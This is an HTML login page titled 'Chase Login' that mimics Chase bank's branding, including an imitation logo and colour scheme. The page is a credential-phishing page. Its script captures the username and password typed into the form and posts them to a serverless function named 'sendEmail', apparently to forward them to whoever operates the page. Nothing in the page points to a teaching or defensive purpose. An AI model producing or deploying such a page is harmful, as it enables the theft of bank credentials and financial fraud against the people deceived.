<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>

<style>
body {
font-family: Arial, sans-serif;
background-color: #e6f0fa; /* light Chase-style blue */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 50px 40px;
border-radius: 12px;
width: 400px;
box-shadow: 0 6px 20px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
margin-bottom: 30px;
}

.logo svg {
width: 180px; /* adjust size */
height: auto;
}

input {
display: block;
width: 100%;
padding: 14px;
margin: 12px 0;
border-radius: 6px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 14px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 6px;
font-size: 16px;
font-weight: bold;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 18px;
font-weight: bold;
min-height: 24px;
}
</style>
</head>
<body>

<div class="container">

<!-- ✅ Inline SVG Chase Logo -->
<div class="logo">
<svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<polygon points="96,0 256,0 416,0 512,96 512,256 512,416 416,512 256,512 96,512 0,416 0,256 0,96" fill="#0072ce"/>
<polygon points="120,120 256,120 392,120 392,256 392,392 256,392 120,392 120,256 120,120" fill="#fff"/>
</svg>
</div>

<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
